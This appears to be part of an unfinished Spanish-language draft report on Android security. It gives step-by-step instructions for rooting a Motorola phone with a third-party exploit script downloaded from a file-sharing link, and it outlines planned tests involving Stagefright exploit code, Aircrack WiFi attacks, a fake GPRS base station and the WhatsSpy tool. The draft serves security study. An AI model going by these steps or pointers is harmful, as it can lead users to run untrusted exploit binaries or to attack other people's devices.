- Se descarga la aplicación que trae los drivers del smartphone desde el sitio web del fábricante [MOTODRI]. Luego se descarga el exploit [ROOTEXP].
- Se instala la aplicación de escritorio "Motorola Device Manager", el cual instala los drivers para que Windows reconozca al smartphone cuando se lo conecta. Esta instalación no requiere configuración.
- Se descomprime el archivo que contiene el exploit en un carpeta temporal. Desde allí, se accede a la carpeta "Root+Boot-AIO" por la línea de comandos para ejecutar el comando "adb devices". Ésto es para probar si el sistema operativo detectó al smartphone. Si la prueba fue exitosa, se continúa con el siguiente paso.
- Se ejecuta el exploit, el mismo no tiene complicaciones: se ejecuta el archivo "runme.bat" desde la línea de comandos que se abrió en el paso anterior. Por cada mensaje que aparece, se presiona la tecla "enter" hasta que indica que se terminó el proceso.

[MOTODRI] [https://motorola-global-portal.custhelp.com/app/answers/detail/a_id/88481]
[ROOTEXP] [http://www.mediafire.com/?5d82batkh7hwm6z]

Fuentes:
http://www.xda-developers.com/root/
http://whiteboard.ping.se/Android/Rooting

4.3.7.3 Observaciones

La forma en que se realizó el rooteo es muy sencillo. No obstante, se corren riesgos dado que la fuente de donde se consiguió el exploit no es confiable. Se podría haber ejecutado el exploit en un entorno Linux.

4.3.8 Octava prueba [COMPLETAR!!!]

Malware

En la intro comentar acerca de las últimas amenazas: Stagefright y el del video MKV.
http://blog.trendmicro.com/trendlabs-security-intelligence/trend-micro-discovers-vulnerability-that-renders-android-devices-silent/

https://blog.zimperium.com/stagefright-vulnerability-details-stagefright-detector-tool-released/
https://blog.zimperium.com/experts-found-a-unicorn-in-the-heart-of-android/
https://blog.zimperium.com/how-to-protect-from-stagefright-vulnerability/
https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/ [ Código fuente del exploit ]

http://www.darkreading.com/mobile-security.asp
http://www.darkreading.com/vulnerabilities-and-threats/the-month-of-android-vulnerabilities-rolls-on/d/d-id/1321849?

Facilidad de desarrollo de un malware con el uso de algunas herramientas.
-> Análisis estático y dinámico.

Ver las vulnerabilidades en..
http://www.cvedetails.com/

4.3.9 Novena prueba

Ataques por Bluetooth
Ataques por WiFi con Aircrack (ver el archivo aircrack.txt)

4.3.10 Decima prueba

Riegos de usar la nube como medio de almacenamiento, como Google Cloud Storage.

4.3.11 Onceaba prueba

Sniffing por GPRS, estación de base falsa.

4.3.12 Doceaba prueba

WhatsSpy-Public

Fuente:
https://gitlab.maikel.pro/maikeldus/WhatsSpy-Public/wikis/home

IDEAS SUELTAS
--------------

- Hablar de la falta protección de la SD Card (pag. 21 del libro de Jeff Six).

4.3 Amenazas generales en los dispositivos

Acceso wireless

- Sniffing

Extravío o robo

- Según un estudio Usar passcodes poco elaboradas 

Phishing

Privacidad

Malware

Uso de la Nube como medio de almacenamiento

- Google Cloud Storage
- ICloud (IPhone)

4.5 Causas

Cuando se dan a conocer bugs, Google responde con fixes que se propagan a cada uno de los vendors, carriers y OEMs (en fin, proveedores), pero lleva un tiempo hasta que estas actualizaciones lleguen al usuario final o a los nuevos usuarios.

:::::: Se puede agregar ::::::

[ http://www.sersc.org/journals/IJSIA/vol9_no4_2015/29.pdf ] [ Android's External Device Attack: Demonstration and Security Suggestions ]
[ http://www.ijcaonline.org/research/volume128/number12/lone-2015-ijca-906683.pdf ] [ Implementation of Forensic Analysis Procedures for WhatsApp and Viber Android Applications ]
